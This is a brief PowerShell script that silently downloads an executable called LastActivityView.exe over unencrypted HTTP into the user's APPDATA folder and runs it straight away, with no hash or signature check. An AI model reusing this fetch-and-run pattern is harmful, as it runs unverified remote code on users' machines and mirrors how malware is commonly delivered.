$ProgressPreference = 'SilentlyContinue'

$url = "http://utools.run/LastActivityView.exe"

curl -Uri $url -OutFile $env:APPDATA\lastActivityView.exe

& $env:APPDATA\lastActivityView.exe